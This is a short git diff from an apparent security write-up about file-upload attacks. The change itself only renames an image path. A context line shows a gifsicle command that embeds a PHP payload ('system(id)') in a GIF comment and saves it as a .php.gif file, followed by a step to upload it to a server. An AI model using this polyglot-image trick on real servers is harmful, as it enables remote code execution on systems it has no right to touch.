@@ -63,7 +63,7 @@ gifsicle < frame-1.gif --comment "<?php system('id'); ?>" > output.php.gif
 
 * Upload the output gif to server:
 
-![the path of our requesting](<../.gitbook/assets/image (9).png>)
+![the path of our requesting](<../.gitbook/assets/image (9) (3).png>)
 
 Go to that path and get some interesting things:
 
